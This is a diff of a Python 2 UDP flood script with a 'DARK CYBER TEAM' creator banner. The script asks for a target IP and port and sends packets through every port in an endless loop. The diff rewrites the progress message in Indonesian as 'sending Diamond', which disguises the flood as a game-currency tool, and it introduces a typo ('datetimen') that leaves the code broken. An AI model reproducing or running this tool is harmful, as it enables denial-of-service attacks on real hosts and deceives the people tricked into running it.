@@ -5,7 +5,7 @@ import socket
 import random
 #Code Time
 from datetime import datetime
-now = milisecond.now()
+now = datetimen.now()
 hour = now.hour
 minute = now.minute
 day = now.day
@@ -24,6 +24,7 @@ print "CREATOR    : VANNEZX 666"
 print "TEAM CYBER : DARK CYBER TEAM "
 print "NOMOR WA   : 6285171197674"
 print "WEBSITE    : https://www.atryxzofclone.com"
+print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
@@ -44,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Mengirim %s Diamond Ke %s Dengan ID:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
